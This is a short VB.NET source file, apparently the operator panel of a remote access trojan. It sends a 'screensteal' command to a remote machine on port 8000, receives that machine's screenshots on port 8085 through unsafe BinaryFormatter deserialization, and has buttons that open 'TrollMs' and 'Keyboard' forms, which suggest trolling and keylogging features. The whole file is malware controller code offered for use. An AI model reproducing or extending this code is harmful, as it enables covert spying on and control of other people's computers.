Option Explicit On
Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.Drawing
Imports System.Runtime.Serialization.Formatters.Binary

Public Class MainWindow
    Dim client As New TcpClient
    Dim server As New TcpListener(8085)
    Dim nstream As NetworkStream
    Dim strHostName As String = System.Net.Dns.GetHostName()
    Dim MyLocIp As String = System.Net.Dns.GetHostByName(strHostName).AddressList(0).ToString()
    Dim listening As New Thread(AddressOf Listen)
    Dim getImage As New Thread(AddressOf receiveImage)

    Private Sub receiveImage()
        Dim bf As New BinaryFormatter
        While client.Connected = True
            nstream = client.GetStream
            PictureBox1.Image = bf.Deserialize(nstream)
        End While
    End Sub

    Private Sub MainWindow_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        PictureBox1.Refresh()
        Try
            client = New TcpClient(Label1.Text, 8000)
            Dim Writer As New StreamWriter(client.GetStream())
            Writer.Write("</> " & "screensteal" & MyLocIp & " <\>")
            Writer.Flush()
            Start()
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Listen()

        server.Start()
            client = server.AcceptTcpClient

            getImage.Start()
    End Sub


    Function Start()
        listening.Start()
    End Function

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        TrollMs.Show()
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Keyboard.Show()
    End Sub
End Class